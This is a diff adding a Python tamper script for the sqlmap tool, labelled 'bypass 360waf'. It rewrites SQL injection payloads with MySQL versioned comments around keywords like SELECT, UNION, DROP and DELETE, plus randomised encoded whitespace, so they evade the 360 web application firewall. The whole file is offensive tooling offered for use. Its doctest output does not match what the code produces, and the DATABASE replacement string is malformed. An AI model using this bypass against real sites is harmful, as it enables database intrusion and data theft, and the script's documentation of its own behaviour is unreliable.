@@ -1,0 +1,43 @@
+#!/usr/bin/env python
+
+"""
+bypass 360waf
+
+author: FK_T
+"Fuzz自动化Bypass软WAF姿势"
+
+"""
+
+import random
+
+from lib.core.enums import PRIORITY
+from lib.core.settings import UNICODE_ENCODING
+
+__priority__ = PRIORITY.LOW
+
+
+def dependencies():
+    pass
+
+
+def tamper(payload, **kwargs):
+    """
+    Replaces keywords
+    >>> tamper('UNION SELECT ID FROM USERS')
+    'union%0a/*!99999select*/id%0a/*!99999from*/users'
+    """
+
+    if payload:
+        payload = payload.replace("SELECT", "/*!99999select*/")
+        payload = payload.replace("UNION", "/*!99999union*/")
+        payload = payload.replace("FROM", "/*!99999from*/")
+        payload = payload.replace("CONCAT", "/*!99999CONCAT*/")
+        payload = payload.replace("CASE", "/*!99999CASE*/")
+        payload = payload.replace("CAST", "/*!99999CAST*/")
+        payload = payload.replace("DATABASE", "/*!99999DATABASE*0a()*/")
+        payload = payload.replace("ALTER", "/*!99999ALTER*/")
+        payload = payload.replace("DELETE", "/*!99999DELETE*/")
+        payload = payload.replace("DROP", "/*!99999DROP*/")
+        space = ['%09', '%0a', '%0b', '%0c', '%0d', '%20', '%a0']
+        payload = payload.replace(" ", space[random.randint(0, 6)])
+    return payload
